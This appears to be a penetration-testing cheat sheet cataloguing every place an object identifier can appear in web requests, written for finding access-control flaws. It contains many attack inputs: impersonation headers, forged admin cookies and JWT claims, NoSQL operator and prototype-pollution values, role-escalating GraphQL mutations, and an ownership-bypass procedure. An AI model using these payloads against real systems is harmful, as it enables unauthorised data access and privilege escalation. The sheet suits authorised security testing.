# Parameter locations — every place an identifier can hide

The id isn't always in the URL. Map every carrier before concluding the
object isn't addressable.

---

## 1. Path segment

```
/users/42
/api/v1/users/42
/api/users/42/profile
/api/orders/1003/items/5         — nested
/api/tenants/7/users/42          — composite tenant:user
/files/docs/report_42.pdf        — filename
/download/42
/invoice/2024/0042               — date+seq
/orders/1003/cancel              — action on id
/admin/users/42                  — admin function
```

Format variants on the same segment: `42`, `42.json`, `42.xml`, `42.csv`,
`042`, `42.0`, `+42`, `0x2a`, `4e1`.

## 2. Query param

```
?id=42  ?user=42  ?user_id=42  ?uid=42  ?account=42  ?doc=42
?file=report.pdf  ?report=42  ?invoice=42  ?order=42  ?item=42
?post=42  ?note=42  ?record=42  ?object=42  ?resource=42  ?entity=42
?owner=42  ?author=42  ?created_by=42  ?tenant=42  ?org=42  ?team=42
?customer=42  ?patient=42  ?member=42  ?employee=42  ?student=42
?target=42  ?parent=42  ?ref=42  ?key=42  ?slug=42  ?uuid=...
?guid=...  ?hash=...  ?filename=  ?path=  ?download=  ?export=
?id[]=42&id[]=43       — array
?ids=1,2,3             — CSV
?filter[user_id]=42    — filter
?where[user_id]=42     — where
?q[user_id_eq]=42      — ransack
?search[owner]=42      — search
?action=view&id=42     — action+id
?for=42  ?of=42  ?belongs_to=42
```

## 3. Body field — flat and nested

```json
{"id":42}  {"user_id":42}  {"uid":42}  {"account":42}  {"doc":42}
{"order_id":42}  {"item_id":42}  {"owner":42}  {"owner_id":42}
{"author":42}  {"created_by":42}  {"tenant":42}  {"org":42}  {"team":42}
{"target":42}  {"file":"report.pdf"}

{"user":{"id":42}}
{"data":{"user_id":42}}
{"input":{"id":42}}            — GraphQL input
{"params":{"id":42}}           — RPC params
{"args":{"id":42}}             — RPC args
{"filter":{"user_id":42}}
{"where":{"user_id":42}}
{"selector":{"_id":"507f..."}} — mongo
{"doc":{"owner":42}}
{"update":{"user_id":42}}
{"criteria":{"owner":42}}
{"query":{"owner":42}}
{"search":{"owner":42}}
{"include":{"user":true}}      — include another's data
{"expand":["user"]}            — expand another's field
{"fields":["secret"]}          — field selection
{"populate":["owner"]}         — populate another's field

{"ids":[1,2,3]}                — bulk
{"id":[42]}                    — array
{"id":{"0":42}}                — object-numeric-key
{"id":{"$eq":42}}              — operator
{"id":{"$ne":0}}               — operator
{"id":{"$in":[1,2,3]}}         — operator
{"id":{"$gt":0}}               — operator
{"user_id":{"$exists":true}}

{"id":42.0}  {"id":"42"}  {"id":"042"}  {"id":"+42"}  {"id":"0x2a"}
{"id":"42e0"}  {"id":"42 "}  {"id":" 42"}  {"id":"42\n"}  {"id":null}
{"id":0}  {"id":-1}  {"id":true}  {"id":[]}  {"id":{}}  {"id":[null]}
{"id":[0]}  {"id":[-1]}  {"id":[true]}  {"id":[[]]}  {"id":[{}]}
{"id":{"id":42}}  {"id":{"$eq":42}}  {"id":{"__proto__":42}}
{"id":{"constructor":42}}  {"id":{"prototype":42}}
{"id":{"0":42,"length":1}}  — array-like object
```

## 4. Header — the trust-override surface

```
X-User-Id: 42        X-User: admin         X-Account: 42
X-Account-Id: 42     X-Tenant: 42          X-Tenant-Id: 42
X-Org: 42            X-Org-Id: 42          X-Team: 42
X-Owner: 42          X-Author: 42          X-Target: 42
X-For-User: 42       X-On-Behalf-Of: 42    X-Act-As: 42
X-Impersonate: 42    X-Switch-User: 42     X-Sudo: 42
X-Su: 42             X-Proxy-User: 42      X-Forwarded-User: admin
X-Real-User: 42      X-Remote-User: 42     X-Authenticated-User: admin
X-Auth-User: admin   X-Original-User: 42   X-Effective-User: 42
X-Delegated-User: 42 X-Service-User: 42    X-Internal-User: 42
X-System-User: 42    X-Api-User: 42
X-Consumer-Username: admin    X-Consumer-Id: 42     — Kong gateway
X-Hasura-User-Id: 42          X-Hasura-Role: admin  — Hasura
X-Hasura-Admin-Secret: x                            — Hasura
X-Scope-Orgid: 42                                   — Salesforce
```

The app may trust a custom header that names the user — a header-set
identity override. `http_probe --header 'X-User-Id: 42'`.

## 5. Cookie / session field

```
Cookie: user=42            Cookie: user_id=42       Cookie: uid=42
Cookie: account=42         Cookie: tenant=42        Cookie: org=42
Cookie: role=admin         Cookie: is_admin=1       Cookie: admin=1
Cookie: su=42              Cookie: impersonate=42   Cookie: switch_user=42
Cookie: on_behalf=42       Cookie: act_as=42        Cookie: proxy_user=42
Cookie: session={"user_id":42}
Cookie: user={"id":42,"role":"admin"}
Cookie: prefs={"user":42}
Cookie: context={"user":42}
```

A plain cookie field carrying the id — edit it directly (no signature).

## 6. JWT claim

```json
{"sub":42}  {"sub":"admin"}  {"uid":42}  {"user_id":42}  {"userId":42}
{"id":42}  {"account":42}  {"tenant":42}  {"org":42}  {"team":42}
{"owner":42}  {"author":42}  {"created_by":42}  {"target":42}
{"user":{"id":42}}  {"profile":{"id":42}}  {"identity":{"id":42}}
{"session":{"user":42}}  {"context":{"user":42}}  {"data":{"user":42}}
{"custom:user_id":42}  {"cognito:username":"admin"}
{"cognito:groups":["admin"]}  {"realm_access":{"roles":["admin"]}}
{"resource_access":{"app":{"roles":["admin"]}}}
{"authorities":["ROLE_ADMIN"]}  {"scope":"admin"}  {"scopes":["admin"]}
{"groups":["admin"]}  {"roles":["admin"]}  {"role":"admin"}
{"isAdmin":true}  {"is_admin":true}  {"admin":true}
{"email":"victim@t.tld"}  {"preferred_username":"victim"}
{"username":"victim"}  {"iss":"other-idp"}  {"aud":"other-client"}
{"client_id":"other-client"}  {"azp":"other-client"}
{"hd":"other-domain"}  {"tenant":"other-tenant"}  {"org":"other-org"}
{"sid":"other-session"}  {"jti":"other-token"}
```

A claim naming another user — if the signature isn't verified or the
key is weak → forge. See `web-auth-session`.

## 7. GraphQL argument

```graphql
query { user(id: 42) { email } }
query { user(id: "42") { email } }
query { node(id: "VXNlcjo0Mg==") { ... on User { email } } }   — Relay gid
query { nodes(ids: ["VXNlcjo0Mg==","VXNlcjo0Mw=="]) { ... } }
query { order(id: 1003) { user { email } } }         — nested object
query { orders(filter: {user_id: 42}) { id } }
query { files(where: {owner: 42}) { name } }
query { search(query: "owner:42") { ... } }
mutation { updateUser(id: 42, role: "admin") { id } }
mutation { deleteUser(id: 42) { id } }
```

The `id`/`filter`/`where`/`search` argument — see `graphql-idor.md`.

## 8. WebSocket message

```json
{"type":"get","id":42}
{"action":"read","user_id":42}
{"method":"fetch","params":{"id":42}}
{"op":"query","doc":"report.pdf"}
{"cmd":"switch","user":42}
{"channel":"user-42"}
{"topic":"order-1003"}
{"room":"private-42"}
{"subscribe":"user/42"}
{"publish":"user/42","data":{}}
```

See `web-websocket` — the message carries the id.

## 9. RPC body

```json
{"jsonrpc":"2.0","method":"getUser","params":{"id":42},"id":1}
{"method":"user.get","params":{"user_id":42}}
{"procedure":"getUser","input":{"id":42}}            — tRPC
{"method":"getUser","args":[42]}
{"method":"UserService.get","params":{"id":42}}
{"service":"user","method":"get","params":{"id":42}}
{"call":"user.get","params":{"id":42}}
{"invoke":"user.get","params":{"id":42}}
{"handler":"user.get","data":{"id":42}}
{"endpoint":"user.get","params":{"id":42}}
```

The `method`/`params`/`input`/`args` nesting and the `id`/`user_id`/
`owner`/`target` naming all carry the id.

## 10. The hidden carrier

- **Referer**: `Referer: /users/42` — some handlers read it.
- **Multipart filename**: `filename="report_42.pdf"`.
- **Set-Cookie response**: a cookie the server sets; replay edited.
- **localStorage/sessionStorage**: an id the JS reads → sends to API.
- **URL fragment**: `#/users/42` — client-side; the JS may send it.
- **the "me" alias**: `/users/me` resolves via session — look for a
  `?user_id=` or `X-User-Id` override that swaps the resolution.

## 11. The carrier-check procedure

For each identifier you found:

1. Where did it appear (path/query/body/header/cookie/JWT/GraphQL/WS/RPC)?
2. Is the same object reachable via a *different* carrier? Try the body
   variant of a path id, the header variant of a query id.
3. Does the handler check ownership on the carrier you used, but not
   the other? A path id may be checked while a body id isn't.
4. Does the app honour a hidden override (`X-User-Id`, `?user_id=`,
   `user_id` in body) that swaps the resolved identity?

The bug is usually in a carrier the developer forgot — the `?user_id=`
override left in for "internal use", the `X-User-Id` header the gateway
sets, the body field the update binds.
